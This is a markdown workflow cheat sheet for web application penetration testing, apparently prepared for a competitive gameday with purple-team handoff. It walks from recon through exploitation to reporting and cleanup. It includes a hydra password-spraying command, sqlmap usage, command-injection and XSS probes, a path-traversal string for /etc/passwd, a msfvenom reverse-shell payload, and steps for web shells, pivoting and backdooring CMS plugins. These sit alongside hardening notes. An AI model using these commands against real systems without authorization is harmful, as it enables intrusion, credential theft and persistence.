# Web App Testing Workflow 

## 1. Recon & Enumeration

- **Identify the surface:**
    
    - `nmap -sV -p- target` → find open ports/services.
        
    - `whatweb`, `wappalyzer`, `httprint` → fingerprint frameworks (WordPress, Django, etc.).
        
- **Map endpoints:**
    
    - `gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt`
        
    - `ffuf -u http://target/FUZZ -w wordlist.txt`
        
- **Parameter discovery:**
    
    - `paramspider`, `arjun` → enumerate GET/POST parameters.
        
- **Subdomain brute‑force:**
    
    - `ffuf -u http://FUZZ.target.com -w subdomains.txt`
        

👉 _Hardening note:_ defenders should minimize exposed endpoints, disable unused subdomains, and enforce least privilege on web servers.

## 2. Authentication & Session Testing

- **Brute/spray:**
    
    - `hydra -l admin -P rockyou.txt target http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid"`
        
- **Session handling:**
    
    - Inspect cookies for `HttpOnly`, `Secure`, `SameSite`.
        
    - Replay session IDs to test fixation.
        
- **Multi‑factor bypass:**
    
    - Look for backup codes, weak OTP endpoints.
        

👉 _Hardening note:_ enforce lockouts, MFA everywhere.

## 3. Input & Injection Attacks

- **SQL Injection:**
    
    - `sqlmap -u "http://target/item.php?id=1" --batch --dbs`
        
- **Command Injection:**
    
    - Test with `;id`, `&& whoami`, backticks.
        
- **XSS:**
    
    - `<script>alert(1)</script>` in parameters, headers, or stored fields.
        
    - Use `dalfox` for automation.
        
- **Template Injection:**
    
    - `{{7*7}}`, `${7*7}` in templating engines.
        

## 4. File & Object Handling

- **File upload abuse:**
    
    - Upload `.php`, `.jsp`, `.aspx` shells.
        
    - Try polyglot files (`.jpg.php`).
        
- **Path traversal:**
    
    - `../../../../etc/passwd`
        
- **Insecure deserialization:**
    
    - Tamper with serialized cookies/JWTs.
        


## 5. Access Control & Logic Abuse

- **IDOR (Insecure Direct Object Reference):**
    
    - Change `user_id=123` → `124`.
        
- **Privilege escalation:**
    
    - Access `/admin` as normal user.
        
- **Business logic flaws:**
    
    - Negative prices, skipping payment steps.
        

## 6. Exploitation & Persistence

- **Web shells:**
    
    - Drop `cmd.php` or `revshell.jsp`.
        
- **Reverse shells:**
    
    - `msfvenom -p php/meterpreter/reverse_tcp LHOST=... LPORT=...`
        
- **Pivoting:**
    
    - Use compromised web server to pivot into internal network.
        
- **Persistence:**
    
    - Add admin users in CMS.
        
    - Backdoor plugins/themes.
        

👉 _Hardening note:_ file integrity monitoring, least privilege, patch CMS/plugins.

## 7. Reporting & Cleanup

- **Document findings:**
    
    - Vulnerability, PoC, impact, remediation.
        
- **Cleanup:**
    
    - Remove shells, accounts, test data.
        

# Suggested Gameday Workflow

1. **Recon sweep** with `nmap`, `ffuf`, `paramspider`.
    
2. **Auth testing** (weak creds, session replay).
    
3. **Injection fuzzing** with `sqlmap`, `dalfox`.
    
4. **File upload & traversal** checks.
    
5. **Privilege escalation** attempts.
    
6. **Exploit → persistence** (drop shell, pivot).
    
7. **Log everything** into your PvJ registry for Purple Team handoff.